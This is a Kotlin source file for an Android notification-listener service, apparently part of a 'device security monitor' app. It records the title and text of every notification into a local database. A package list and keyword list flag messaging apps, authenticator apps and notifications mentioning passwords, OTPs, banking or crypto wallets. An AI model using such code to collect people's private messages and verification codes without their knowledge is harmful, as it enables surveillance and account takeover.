package com.devicesecurity.monitor.service

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import com.devicesecurity.monitor.data.db.AppDatabase
import com.devicesecurity.monitor.data.db.entity.NotificationEntity
import kotlinx.coroutines.*

class NotificationCaptureService : NotificationListenerService() {

    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        sbn ?: return
        serviceScope.launch {
            saveNotification(sbn)
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
    }

    private suspend fun saveNotification(sbn: StatusBarNotification) {
        val extras = sbn.notification.extras
        val title = extras.getCharSequence("android.title")?.toString() ?: ""
        val body = extras.getCharSequence("android.text")?.toString() ?: ""
        val packageLabel = packageManager.getApplicationLabel(
            packageManager.getApplicationInfo(sbn.packageName, 0)
        ).toString()

        val isSensitive = checkIfSensitive(sbn.packageName, title, body)

        val entity = NotificationEntity(
            packageName = sbn.packageName,
            packageLabel = packageLabel,
            title = title,
            body = body,
            isSensitive = isSensitive
        )

        withContext(Dispatchers.IO) {
            try {
                AppDatabase.getInstance(applicationContext)
                    .notificationDao()
                    .insert(entity)
            } catch (_: Exception) {
            }
        }
    }

    private fun checkIfSensitive(packageName: String, title: String, body: String): Boolean {
        val sensitivePackages = setOf(
            "com.whatsapp",
            "com.instagram.android",
            "org.telegram.messenger",
            "com.facebook.orca",
            "com.facebook.auth.login",
            "com.google.android.gms",
            "com.android.vending",
            "com.google.android.apps.authenticator2"
        )

        if (sensitivePackages.any { packageName.startsWith(it) }) return true

        val sensitiveKeywords = listOf(
            "password", "pin", "otp", "code", "verification",
            "bank", "transaction", "payment", "login",
            "crypto", "wallet", "investment"
        )

        val content = "$title $body".lowercase()
        return sensitiveKeywords.any { content.contains(it) }
    }

    override fun onDestroy() {
        super.onDestroy()
        serviceScope.cancel()
    }
}
